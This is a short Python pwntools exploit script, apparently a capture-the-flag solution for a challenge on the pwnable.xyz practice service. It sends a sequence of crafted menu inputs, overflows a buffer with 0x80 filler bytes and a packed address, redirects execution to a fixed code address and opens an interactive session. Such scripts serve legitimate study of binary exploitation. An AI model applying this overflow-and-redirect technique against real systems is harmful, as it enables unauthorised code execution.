from pwn import *
context.update(arch="amd64", endian="little", os="linux", log_level="info",
               terminal=["tmux", "split-window", "-v", "-p 85"],)
LOCAL = False
# r = process("./challenge")
r = remote("svc.pwnable.xyz", 30013)


def attach(r):
    if LOCAL:
        bkps = ["* 0x0000000000400b1a"]
        gdb.attach(r, '\n'.join(["break %s"%(x,) for x in bkps]))
    return

def main():
    attach(r)
    r.sendafter(":","\x00")
    r.sendafter(":","11")

    for i in range(10):
        r.sendafter(">","1")
        r.sendafter(":","\x00")

    r.sendafter(">","1")
    r.sendafter(":","A" * 0x80 + p64(0x88602040) )
    r.sendafter(">","2")
    r.sendafter(":",p64(0x40094C))
    r.interactive()

main()
